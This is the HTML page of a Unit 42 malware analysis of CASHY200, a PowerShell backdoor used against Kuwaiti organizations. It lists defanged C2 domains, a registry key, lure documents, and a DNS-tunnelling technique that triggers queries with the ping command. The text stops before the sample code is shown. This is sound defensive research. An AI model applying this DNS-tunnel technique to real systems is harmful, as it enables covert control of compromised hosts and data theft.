<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/js/min/crayon.min.js?ver=_2.7.2_beta'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpp_params = {"sampling_active":"0","sampling_rate":"100","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":"100088","token":"b09d8c8c9d","debug":""};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/wordpress-popular-posts/assets/js/wpp-5.0.0.min.js?ver=5.0.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpml_xdomain_data = {"css_selector":"wpml-ls-item","ajax_url":"https:\/\/unit42.paloaltonetworks.com\/wp-admin\/admin-ajax.php","current_lang":"en"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/sitepress-multilingual-cms/res/js/xdomain-data.js?ver=4.3.5'></script>
<link rel='https://api.w.org/' href='https://unit42.paloaltonetworks.com/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://unit42.paloaltonetworks.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://unit42.paloaltonetworks.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.4.1" />
<link rel='shortlink' href='https://unit42.paloaltonetworks.com/?p=100088' />
<link rel="alternate" type="application/json+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fmore-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://unit42.paloaltonetworks.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fmore-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection%2F&#038;format=xml" />
<meta name="generator" content="WPML ver:4.3.5 stt:1,28;" />
<meta name="google-site-verification" content="zHZtYOWm9hm4SZgsH7wqiYcOwmsAsxDUDU4UD1QxB40" /><style>#wpdevart_lb_overlay{background-color:#000000;} #wpdevart_lb_overlay.wpdevart_opacity{opacity:0.8 !important;} #wpdevart_lb_main_desc{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;} #wpdevart_lb_information_content{
				 -webkit-transition: opacity 0.3s ease;
				 -moz-transition: opacity 0.3s ease;
				 -o-transition: opacity 0.3s ease;
				 transition: opacity 0.3s ease;}
		#wpdevart_lb_information_content{
			width:100%;	
		}
		#wpdevart_info_counter_of_imgs{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_caption{
			    display: inline-block;
				padding-left:15px;
				padding-right:4px;
				font-size:20px;
				color:#000000;
		}
		#wpdevart_info_title{
			    display: inline-block;
				padding-left:5px;
				padding-right:5px;
				font-size:15px;
				color:#000000;
		}
		@-webkit-keyframes rotate {
			to   {-webkit-transform: rotate(360deg);}
			from  {-webkit-transform: rotate(0deg);}
		}
		@keyframes rotate {
			to   {transform: rotate(360deg);}
			from  {transform: rotate(0deg);}
		}
		#wpdevart_lb_loading_img,#wpdevart_lb_loading_img_first{
			-webkit-animation: rotate 2s linear  infinite;
    		animation: rotate 2s linear infinite;
		}
	  </style>        <script>var $ = jQuery;</script>
  
  
<script type="text/javascript">
;(function(win, doc, style, timeout) {
var STYLE_ID = 'at-body-style';
function getParent() {
return doc.getElementsByTagName('head')[0];
}
function addStyle(parent, id, def) {
if (!parent) {
return;
}
var style = doc.createElement('style');
style.id = id;
style.innerHTML = def;
parent.appendChild(style);
}
function removeStyle(parent, id) {
if (!parent) {
return;
}
var style = doc.getElementById(id);
if (!style) {
return;
}
parent.removeChild(style);
}
addStyle(getParent(), STYLE_ID, style);
setTimeout(function() {
removeStyle(getParent(), STYLE_ID);
}, timeout);
}(window, document, "body {visibility:hidden !important}", 3000));
</script>

<script src="//assets.adobedtm.com/9273d4aedcd2/0d76ae0322d7/launch-425c423d843b.min.js" async></script>
<script type="text/javascript" src="https://www.paloaltonetworks.com/content/dam/pan/en_US/includes/attribution.js"></script>
  </head>
  <body class="post-template-default single single-post postid-100088 single-format-standard">
    <!--[if IE]>
      <div class="alert alert-warning">
        You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.      </div>
    <![endif]-->
    <header class="haeder py-15 position-relative z-index-2">
  <div class="container px-sm-30 px-35">
    <div class="row">
      <div class="first-logo col-sm-auto col-6 mb-sm-0 mb-40 text-sm-center order-1">
                  <a href="https://www.paloaltonetworks.com/">
<!--<img src="/wp-content/uploads/2019/07/paloaltonetwork.svg" class="attachment-full size-full" alt="" height="43" width="124" />-->
<svg width="140" height="26" viewBox="0 0 140 26" fill="none" xmlns="http://www.w3.org/2000/svg">
<path d="M59.4802 4.69592C57.6721 4.69592 55.7937 5.18876 53.469 6.43377L54.7605 9.62741C56.7794 8.50019 58.447 8.00735 59.6682 8.00735C61.0538 8.00735 61.6644 8.52395 61.6644 9.20483V9.25133C61.6644 9.72143 61.2883 9.97974 60.3729 10.0738L58.7766 10.238C54.7843 10.6606 53.1404 12.3985 53.1404 14.7934V14.9577C53.1404 17.2359 55.0188 19.0203 57.6721 19.0203C59.4192 19.0203 60.937 18.2826 61.8597 16.9807L62.1572 18.7857H65.7734V10.5904C65.7734 6.71584 63.5428 4.69592 59.4802 4.69592ZM59.1279 15.8969C57.7899 15.8969 57.1555 15.3803 57.1555 14.5816V14.5351C57.1555 13.8305 57.5543 13.3139 59.0101 13.1031L59.6445 13.0091C60.5713 12.8799 61.1406 12.7095 61.6644 12.3923V13.4317C61.6644 15.0052 60.6777 15.8969 59.1279 15.8969Z" fill="white"/>
<path d="M25.4785 4.78994L20.8528 0.164276L16.2271 4.78994L18.5281 7.09192L6.92828 18.6917L11.5539 23.3174L16.1796 18.6917L13.8787 16.3908L25.4785 4.78994Z" fill="white"/>
<path d="M11.6001 0.164048L0 11.7642L4.62603 16.3902L16.2262 4.79008L11.6001 0.164048Z" fill="white"/>
<path d="M27.7794 7.09215L16.1793 18.6923L20.8053 23.3183L32.4054 11.7182L27.7794 7.09215Z" fill="white"/>
<path d="M72.231 0H68.1219V18.7857H72.231V0Z" fill="white"/>
<path d="M46.2366 4.69592C44.3685 4.69592 42.8683 5.52249 42.0428 6.81709L41.7287 4.93046H38.1125V23.4806H42.2215V17.051C43.0037 18.2567 44.4832 19.0193 46.2366 19.0193C49.5242 19.0193 52.2013 16.1077 52.2013 12.0916V11.6215C52.2013 7.60853 49.5242 4.69592 46.2366 4.69592ZM47.9744 11.9759C47.9744 14.0888 46.871 15.6159 45.0391 15.6159C43.2072 15.6159 42.1038 14.0898 42.1038 11.9759V11.7414C42.1038 9.62741 43.2072 8.10137 45.0391 8.10137C46.871 8.10137 47.9744 9.62741 47.9744 11.7414V11.9759Z" fill="white"/>
<path d="M127.672 4.69592C123.469 4.69592 120.51 7.6075 120.51 11.6236V12.0937C120.51 16.1087 123.469 19.0213 127.672 19.0213C131.875 19.0213 134.834 16.1097 134.834 12.0937V11.6236C134.834 7.60853 131.875 4.69592 127.672 4.69592ZM130.607 11.9759C130.607 14.0888 129.504 15.6159 127.672 15.6159C125.84 15.6159 124.736 14.0898 124.736 11.9759V11.7414C124.736 9.62741 125.84 8.10137 127.672 8.10137C129.504 8.10137 130.607 9.62741 130.607 11.7414V11.9759Z" fill="white"/>
<path d="M138.708 5.54211V5.47185C138.708 5.07304 138.404 4.79097 137.863 4.79097H136.924V6.9514H137.37V6.22299H137.866L138.239 6.9514H138.732L138.274 6.09694C138.552 6.01119 138.708 5.80248 138.708 5.54211ZM137.369 5.18979H137.862C138.144 5.18979 138.261 5.28381 138.261 5.49562V5.51938C138.261 5.70742 138.143 5.82418 137.862 5.82418H137.369V5.18979Z" fill="white"/>
<path d="M137.769 3.63998C136.502 3.63998 135.539 4.60293 135.539 5.87067C135.539 7.13842 136.502 8.10137 137.769 8.10137C139.037 8.10137 140 7.13842 140 5.87067C140 4.60293 139.037 3.63998 137.769 3.63998ZM137.769 7.79554C136.666 7.79554 135.867 6.99687 135.867 5.86964C135.867 4.74241 136.666 3.94375 137.769 3.94375C138.873 3.94375 139.671 4.74241 139.671 5.86964C139.671 6.99687 138.873 7.79554 137.769 7.79554Z" fill="white"/>
<path d="M108.416 0H104.307V18.7857H108.416V0Z" fill="white"/>
<path d="M116.518 15.6159C115.321 15.6159 114.874 15.029 114.874 13.7613V8.10137H119.712V4.93149H114.874V1.76058L110.765 2.37121V14.159C110.765 17.3765 112.409 19.0203 115.697 19.0203C117.153 19.0203 118.867 18.5739 120.276 17.7753L119.102 14.8637C118.279 15.31 117.129 15.6159 116.518 15.6159Z" fill="white"/>
<path d="M95.6662 4.69592C93.8581 4.69592 91.9797 5.18876 89.655 6.43377L90.9465 9.62741C92.9654 8.50019 94.633 8.00735 95.8542 8.00735C97.2397 8.00735 97.8504 8.52395 97.8504 9.20483V9.25133C97.8504 9.72143 97.4743 9.97974 96.5589 10.0738L94.9626 10.238C90.9702 10.6606 89.3264 12.3985 89.3264 14.7934V14.9577C89.3264 17.2359 91.2048 19.0203 93.8581 19.0203C95.6042 19.0203 97.123 18.2826 98.0456 16.9807L98.3432 18.7857H101.959V10.5904C101.959 6.71584 99.7287 4.69592 95.6662 4.69592ZM95.3138 15.8969C93.9748 15.8969 93.3415 15.3803 93.3415 14.5816V14.5351C93.3415 13.8305 93.7403 13.3139 95.1961 13.1031L95.8304 13.0091C96.7572 12.8799 97.3265 12.7095 97.8493 12.3923V13.4317C97.8493 15.0052 96.8637 15.8969 95.3138 15.8969Z" fill="white"/>
<path d="M81.225 4.69592C77.022 4.69592 74.0629 7.6075 74.0629 11.6236V12.0937C74.0629 16.1087 77.022 19.0213 81.225 19.0213C85.4281 19.0213 88.3872 16.1097 88.3872 12.0937V11.6236C88.3862 7.60853 85.4281 4.69592 81.225 4.69592ZM84.1593 11.9759C84.1593 14.0888 83.0559 15.6159 81.224 15.6159C79.3921 15.6159 78.2887 14.0898 78.2887 11.9759V11.7414C78.2887 9.62741 79.3921 8.10137 81.224 8.10137C83.0559 8.10137 84.1593 9.62741 84.1593 11.7414V11.9759Z" fill="white"/>
<path d="M98.0446 22.1168H99.0975L100.551 24.0334H100.566V22.1168H101.532V25.4964H100.513L99.0251 23.5313H99.0107V25.4964H98.0446V22.1168Z" fill="white"/>
<path d="M102.816 22.1168H105.771L105.81 22.9372H103.825V23.4011H105.385V24.1491H103.825V24.676H105.868L105.829 25.4964H102.816V22.1168Z" fill="white"/>
<path d="M107.925 22.9857H106.742L106.78 22.1168H110.088L110.127 22.9857H108.944V25.4964H107.925V22.9857Z" fill="white"/>
<path d="M110.943 22.1168H112.024L112.575 24.4632H112.628L113.342 22.1168H114.333L115.033 24.4632H115.086L115.627 22.1168H116.66L115.771 25.4964H114.444L113.826 23.4589H113.797L113.169 25.4964H111.836L110.943 22.1168Z" fill="white"/>
<path d="M117.404 23.8071C117.404 22.7057 118.152 22.0155 119.335 22.0155C120.518 22.0155 121.267 22.7057 121.267 23.8071C121.267 24.9085 120.519 25.5987 119.335 25.5987C118.152 25.5987 117.404 24.9075 117.404 23.8071ZM120.257 23.8071C120.257 23.2234 119.92 22.8752 119.335 22.8752C118.75 22.8752 118.412 23.2234 118.412 23.8071C118.412 24.3919 118.75 24.7391 119.33 24.7391C119.914 24.7391 120.257 24.3909 120.257 23.8071Z" fill="white"/>
<path d="M122.363 22.1168H124.334C125.231 22.1168 125.672 22.5414 125.672 23.3287C125.672 23.8691 125.449 24.2369 125.014 24.4105L125.816 25.4974H124.667L124.044 24.6089H123.378V25.4974H122.363V22.1168ZM124.202 23.8164C124.54 23.8164 124.661 23.6284 124.661 23.3721C124.661 23.1159 124.54 22.933 124.202 22.933H123.377V23.8164H124.202Z" fill="white"/>
<path d="M126.989 22.1168H128.002V23.3628H128.418L129.408 22.1168H130.547L130.552 22.1209L129.259 23.7389L130.625 25.4923L130.62 25.4964H129.437L128.414 24.1977H128.002V25.4964H126.989V22.1168Z" fill="white"/>
<path d="M131.402 25.2743V24.3475H131.407C131.972 24.6327 132.523 24.7721 133 24.7721C133.363 24.7721 133.546 24.6853 133.546 24.5159C133.546 24.3465 133.425 24.3031 132.7 24.1873C131.909 24.0623 131.382 23.8247 131.382 23.1438C131.382 22.5115 131.938 22.0238 133.024 22.0238C133.459 22.0238 133.912 22.1158 134.333 22.2945V23.212L134.328 23.2172C133.927 22.9857 133.386 22.84 132.951 22.84C132.565 22.84 132.411 22.932 132.411 23.0859C132.411 23.2843 132.648 23.3029 133.242 23.4052C134.033 23.5406 134.56 23.7627 134.56 24.4777C134.56 25.0325 134.145 25.5884 132.952 25.5884C132.364 25.5884 131.894 25.4675 131.402 25.2743Z" fill="white"/>
</svg>

</a>

      </div>

      <div class="col-sm-auto col-6 text-sm-center order-sm-2 order-4 second-logo-unit">
        <a href="https://unit42.paloaltonetworks.com/"><img src="/wp-content/uploads/2019/07/unit42.svg" class="attachment-full size-full" alt="" height="35" width="105" /></a>
      </div>

      <div class="col-auto d-sm-none ml-auto mb-40 order-2">
        <button class="btn__search" data-toggle="collapse" data-target="#search"><i class="ui ui-1"></i></button>
      </div>

      <div id="search" class="collapse d-sm-block col-sm-auto col-12 ml-auto order-3">
        <div class="pt-sm-0 pt-20 pb-sm-0 pb-40 mt-sm-0 mt-n30">
                      <input type="search" placeholder="Search Unit 42" id="innerSearch" class="header__search" value="" required>
                  </div>
      </div>

      <div class="col-auto d-sm-none d-flex ml-auto align-items-center order-5">
        <button class="btn__menu rounded" data-toggle="collapse" data-target="#navigation">Menu</button>
      </div>
    </div>
  </div>
</header>

<nav id="navigation" class="site-nav collapse d-sm-block pb-20 mt-sm-10">
  <div class="container px-sm-30">
    <ul id="menu-primary-navigation" class="main-menu d-sm-flex font-weight-medium"><li id="menu-item-97290" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-97290"><a href="https://unit42.paloaltonetworks.com/tools/">Tools</a></li>
<li id="menu-item-41" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-41"><a href="https://unit42.paloaltonetworks.com/atoms/">ATOMs</a></li>
<li id="menu-item-98931" class="menu-item menu-item-type-post_type_archive menu-item-object-events menu-item-98931"><a href="https://unit42.paloaltonetworks.com/events/">Speaking Events</a></li>
<li id="menu-item-81229" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-81229"><a href="https://unit42.paloaltonetworks.com/about-unit-42/">About Us</a></li>
</ul>  </div>
</nav>

  <article class="article overflow-hidden">
    
<header class="article__header py-sm-25 pt-40 pb-25 bg-gray-700">
  <div class="container">
    
    <h1 class="article__header__title mb-sm-30 mb-40">xHunt Campaign: New PowerShell Backdoor Blocked Through DNS Tunnel Detection</h1>

    <ul class="article__entry-meta d-flex flex-wrap align-items-center text-black">
      <li class="mr-10 mb-10 px-20 rounded-pill d-flex bg-gray-200"><div class="post-views post-100088 entry-meta">
			
			
			<span class="post-views-count">28,343</span>
			</div> <span class="ml-5">people reacted</span></li>
      <li class="d-sm-none col-12 p-0"></li>
      <li class="mr-10 mb-10 px-20 rounded-pill bg-gray-200"><span class="ldc-ul_cont idc_ul_cont_not_liked_inner" onclick="alter_ul_post_values(this,'100088','like')"><i class="ui ui-2"></i><span class="ml-5">12</span></span></li>
      <li class="mb-10 px-20 rounded-pill bg-gray-200"><span class="span-reading-time rt-reading-time"><span class="rt-label rt-prefix"></span> <span class="rt-time"> 11</span> <span class="rt-label rt-postfix"></span></span> min. read</li>
    </ul>

    <div class="article__share position-relative">
      <div class="dropdown dropdown-right">
        <button type="button" class="px-25 text-black bg-white text-uppercase rounded-pill" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">Share <i class="ui ui-6 ml-10 align-text-top"></i>
        </button>
        <div class="dropdown-menu rounded-pill" role="toolbar">
          <div class="share-dropdown px-20 py-10 text-black font-size-sm">
            <div class="row align-items-center flex-nowrap">
              <div class="col">
                <div class="d-flex align-items-center">
                  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Funit42.paloaltonetworks.com%2Fmore-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection%2F" target="_blank"><i class="ui ui-7"></i></a>
                  <a href="https://twitter.com/home?status=https%3A%2F%2Funit42.paloaltonetworks.com%2Fmore-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection%2F+-+xHunt+Campaign%3A+New+PowerShell+Backdoor+Blocked+Through+DNS+Tunnel+Detection" target="_blank"><i class="ui ui-8"></i></a>
                  <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Funit42.paloaltonetworks.com%2Fmore-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection%2F&title=xHunt+Campaign%3A+New+PowerShell+Backdoor+Blocked+Through+DNS+Tunnel+Detection&summary=&source=" target="_blank"><i class="ui ui-9"></i></a>
                  <a href="//www.reddit.com/submit?url=https://unit42.paloaltonetworks.com/more-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection/" target="_blank"><i class="ui ui-10"></i></a>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</header>    <div class="article__summary py-25 text-gray-500 font-size-sm">
  <div class="container">
    <div class="row align-items-center no-gutters">
      <div class="col-sm-auto col-12 mb-sm-0 mb-35">
        <i class="ui ui-11 text-gray-700 mr-sm-20"></i>
      </div>
  
      <div class="col-sm col-12">
        <p>
          By <a href="https://unit42.paloaltonetworks.com/author/robertfalcone/" title="Posts by Robert Falcone" class="author url fn" rel="author">Robert Falcone</a> and <a href="https://unit42.paloaltonetworks.com/author/brittany-ash/" title="Posts by Brittany Barbehenn" class="author url fn" rel="author">Brittany Barbehenn</a>        </p>
        <p><time datetime="2019-10-10T12:00:21+00:00">October 10, 2019 at 5:00 AM</time></p>
        <p>Category: <a href="https://unit42.paloaltonetworks.com/category/unit-42/" rel="category tag">Unit 42</a></p>
        <p>Tags: <a href="https://unit42.paloaltonetworks.com/tag/cashy200/" rel="tag">CASHY200</a>, <a href="https://unit42.paloaltonetworks.com/tag/dns-security/" rel="tag">DNS security</a>, <a href="https://unit42.paloaltonetworks.com/tag/dns-tunneling/" rel="tag">dns tunneling</a>, <a href="https://unit42.paloaltonetworks.com/tag/malware/" rel="tag">malware</a>, <a href="https://unit42.paloaltonetworks.com/tag/xhunt/" rel="tag">xHunt</a></p>
      </div>
    </div>
  </div>
</div>    <div class="py-30 bg-white">
      <div class="container">
        <div class="article__content pb-30">
                      <figure class="mb-30 text-center">
              <img width="900" height="450" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d1-1-900x450.png" class="attachment-single size-single" alt="" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d1-1-900x450.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d1-1-300x150.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d1-1-768x384.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d1-1-1024x512.png 1024w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d1-1-370x185.png 370w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/Adversary-r3d1-1.png 2001w" sizes="(max-width: 900px) 100vw, 900px" />            </figure>
                    <p class="wpml-ls-statics-post_translations wpml-ls">This post is also available in: 
    <span class="wpml-ls-slot-post_translations wpml-ls-item wpml-ls-item-ja wpml-ls-first-item wpml-ls-last-item wpml-ls-item-legacy-post-translations"><a href="https://unit42.paloaltonetworks.jp/more-xhunt-new-powershell-backdoor-blocked-through-dns-tunnel-detection/" class="wpml-ls-link"><span class="wpml-ls-native" lang="ja">日本語</span><span class="wpml-ls-display"><span class="wpml-ls-bracket"> (</span>Japanese<span class="wpml-ls-bracket">)</span></span></a></span></p><h2>Executive Summary</h2>
<p>During our continued analysis of the <a href="https://unit42.paloaltonetworks.com/xhunt-campaign-attacks-on-kuwait-shipping-and-transportation-organizations/">xHunt campaign</a>, we observed several domains with ties to the <span style="font-family: 'courier new', courier, monospace;">pasta58[.]com</span> domain associated with known Sakabota command and control (C2) activity. In June 2019, we observed one of these overlapping domains, specifically, w<span style="font-family: 'courier new', courier, monospace;">indows64x[.]com</span>, being used as the C2 server for a new PowerShell based backdoor that we’ve named CASHY200. This PowerShell backdoor used DNS tunneling to communicate with its C2 server, specifically by issuing DNS A queries to the actor controlled name server at the aforementioned domain. CASHY200 parses data provided by the C2 server within DNS answers to run commands on the system and send the results back to the C2 via DNS queries. In several samples, CASHY200 used randomly generated identifiers that are stored in the registry at <span style="font-family: 'courier new', courier, monospace;">HKCU\Software\Microsoft\Cashe\index</span> and used the command value <span style="font-family: 'courier new', courier, monospace;">200</span> to communicate with the C2 server. These details are the basis for the name CASHY200.</p>
<p>While we do not have telemetry showing how the CASHY200 PowerShell backdoor was delivered, in September 2019 we observed a host based in Kuwait beaconing to the <span style="font-family: 'courier new', courier, monospace;">windows64x[.]com</span> domain using the same DNS tunneling protocol as the CASHY200 payload. Fortunately, the beaconing to this domain was blocked by our DNS security service, so the adversary was no longer able to communicate with their payload using this DNS tunnel. By analyzing the lineage of this tool, we found that actors may have used CASHY200 when targeting Kuwaiti government organizations starting in the spring of 2018 and continuing throughout 2019, according to our open source collection efforts.</p>
<h2><a id="post-100088-_q972c8wuotnz"></a>CASHY200 Attacks</h2>
<p>On September 16, 2019, an organization based in Kuwait enabled our DNS Security subscription, which detected malicious DNS tunneling activity within minutes. The DNS tunnel was communicating with the <span style="font-family: 'courier new', courier, monospace;">windows64x[.]com</span> domain, which we had previously linked to the <a href="https://unit42.paloaltonetworks.com/xhunt-campaign-attacks-on-kuwait-shipping-and-transportation-organizations/">xHunt campaign that targeted shipping and transportation organizations in Kuwait</a>. By blocking the DNS tunnel, the actor no longer had the ability to access the compromised systems. We do not have any telemetry on the initial breach that resulted in the installation of the payload using the DNS tunnel.</p>
<p>While investigating the activity, we found a CASHY200 PowerShell-based payload that communicated with <span style="font-family: 'courier new', courier, monospace;">windows64x[.]com</span>. We analyzed this PowerShell script and found that its DNS tunneling protocol matched the outbound DNS requests at the Kuwaiti organization which were blocked by DNS Security. We will provide an analysis of CASHY200 and its DNS tunneling protocol in a later section of this blog.</p>
<p>After gathering additional CASHY200 samples, we observed evidence that the threat group was actively developing this PowerShell-based tool for use in their attack campaigns. While researching this evolution, we found several samples that date back to May and June of 2018. On May 1 and June 3, 2018, we first saw executables that installed and executed CASHY200 PowerShell scripts that communicated with the domains <span style="font-family: 'courier new', courier, monospace;">windows-updates[.]com</span> and <span style="font-family: 'courier new', courier, monospace;">firewallsupports[.]com</span>, respectively. We do not have telemetry to determine the organizations that were impacted by these payloads, however, the <a href="https://twitter.com/Voulnet/status/1014951078364876801">Tweets</a> by <a href="https://twitter.com/Voulnet">@Voulnet</a> seen in Figure 1 suggest that Word documents were used to deliver PowerShell payloads using <span style="font-family: 'courier new', courier, monospace;">firewallsupports[.]com</span> as a C2 to target government organizations in Kuwait.</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-1.-Tweet-by-@Voulnet-suggesting-that-PowerShell-based-payloads-communicating-with-firewallsupports.com-were-used-to-target-the-Kuwaiti-government.png" rel="wpdevart_lightbox"><img class="aligncenter wp-image-100099" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-1.-Tweet-by-@Voulnet-suggesting-that-PowerShell-based-payloads-communicating-with-firewallsupports.com-were-used-to-target-the-Kuwaiti-government.png" alt="" width="600" height="784" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-1.-Tweet-by-@Voulnet-suggesting-that-PowerShell-based-payloads-communicating-with-firewallsupports.com-were-used-to-target-the-Kuwaiti-government.png 1196w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-1.-Tweet-by-@Voulnet-suggesting-that-PowerShell-based-payloads-communicating-with-firewallsupports.com-were-used-to-target-the-Kuwaiti-government-230x300.png 230w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-1.-Tweet-by-@Voulnet-suggesting-that-PowerShell-based-payloads-communicating-with-firewallsupports.com-were-used-to-target-the-Kuwaiti-government-768x1003.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-1.-Tweet-by-@Voulnet-suggesting-that-PowerShell-based-payloads-communicating-with-firewallsupports.com-were-used-to-target-the-Kuwaiti-government-784x1024.png 784w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-1.-Tweet-by-@Voulnet-suggesting-that-PowerShell-based-payloads-communicating-with-firewallsupports.com-were-used-to-target-the-Kuwaiti-government-900x1175.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2019/10/Figure-1.-Tweet-by-@Voulnet-suggesting-that-PowerShell-based-payloads-communicating-with-firewallsupports.com-were-used-to-target-the-Kuwaiti-government-370x483.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></a></p>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Figure 1. Tweet by @Voulnet suggesting that PowerShell-based payloads communicating with <span style="font-family: 'courier new', courier, monospace;">firewallsupports[.]com</span> were used to target the Kuwaiti government</em></span></p>
<p>While we are unable to confirm that this threat group used CASHY200 payloads configured to communicate with <span style="font-family: 'courier new', courier, monospace;">firewallsupports[.]com</span> to target government organizations in Kuwait, we did discover Word documents that installed CASHY200 payloads configured with the aforementioned domain as its C2 which also contained the logo of a Kuwaiti government organization as part of its social engineering lure image. This aligns with the general targeting observed in the xHunt campaign, in which the attacks were solely on Kuwaiti organizations. Table 1 lists the Word documents seen installing CASHY200, which shows another C2 domain, <span style="font-family: 'courier new', courier, monospace;">winx64-microsoft[.]com</span>, used by this threat group.</p>
<table style="width: 100%;">
<tbody>
<tr>
<td style="width: 138.75px;"><strong>Modified time</strong></td>
<td style="width: 77.8409px;"><strong>SHA256</strong></td>
<td style="width: 177.841px;"><strong>Filename</strong></td>
<td style="width: 172.386px;"><strong>C2 domain</strong></td>
</tr>
<tr>
<td style="width: 138.75px;">8/20/2018 7:00:00</td>
<td style="width: 77.8409px;">bce37fc0&#8230;</td>
<td style="width: 177.841px;">عيد الأضحى.docm</td>
<td style="width: 172.386px;">firewallsupports[.]com</td>
</tr>
<tr>
<td style="width: 138.75px;">8/13/2018 9:07:00</td>
<td style="width: 77.8409px;">5a3c156&#8230;</td>
<td style="width: 177.841px;">دلیل تسجیل الدخول.docm</td>
<td style="width: 172.386px;">firewallsupports[.]com</td>
</tr>
<tr>
<td style="width: 138.75px;">1/1/1980 0:00:00</td>
<td style="width: 77.8409px;">45b2db5&#8230;</td>
<td style="width: 177.841px;">Update list soft-Ad.docm</td>
<td style="width: 172.386px;">winx64-microsoft[.]com</td>
</tr>
<tr>
<td style="width: 138.75px;">7/4/2018 5:45:00</td>
<td style="width: 77.8409px;">ce6b44af&#8230;</td>
<td style="width: 177.841px;">قائمة النماذج العامة01.docm</td>
<td style="width: 172.386px;">firewallsupports[.]com</td>
</tr>
<tr>
<td style="width: 138.75px;">7/4/2018 6:10:00</td>
<td style="width: 77.8409px;">0b54763&#8230;</td>
<td style="width: 177.841px;">قائمة النماذج العامة02.docm</td>
<td style="width: 172.386px;">firewallsupports[.]com</td>
</tr>
<tr>
<td style="width: 138.75px;">7/4/2018 6:09:00</td>
<td style="width: 77.8409px;">396235b&#8230;</td>
<td style="width: 177.841px;">قائمة النماذج العامة03.docm</td>
<td style="width: 172.386px;">firewallsupports[.]com</td>
</tr>
</tbody>
</table>
<p style="text-align: center;"><span style="font-size: 10pt;"><em>Table 1. Malicious Word documents installing CASHY200 payloads</em></span></p>
<p>Also of interest, on May 14, 2019, an individual posted on Microsoft’s <a href="https://social.technet.microsoft.com/Forums/en-US/0d3bb3c9-eef3-4754-8557-99e982407ad7/nt-authoritysystem-is-pinging-to-a-certain-site-everytime?forum=winserversecurity">TechNet forum</a> requesting information on an activity they observed on two of their servers that involved the domain <span style="font-family: 'courier new', courier, monospace;">windows64x[.]com</span>. The activity described by the individual is tunneling activity to the same C2 domain using the same DNS tunneling protocol that we blocked at the Kuwaiti government organization. While we cannot confirm the organization experiencing this activity, based on the details provided in the forum post, we believe that the individual also worked at another Kuwaiti government organization.</p>
<p>Another interesting detail provided in the post to TechNet was that the queries for the DNS tunnel were generated using the command <span style="font-family: 'courier new', courier, monospace;">ping -n 1 &lt;domain&gt;</span>. We observed the same technique to issue queries for a DNS Tunnel in a CASHY200 sample configured with <span style="font-family: 'courier new', courier, monospace;">firewallsupports[.]com</span> as the C2, as depicted in the code in Figure 2. If a user (or malicious script in this case) provides a domain to the ping command, the application will attempt to resolve the domain before sending the ICMP messages to ping the remote system. Using the ping application in this manner effectively sends the query for the DNS tunnel.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-5f69289878e57507463583" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
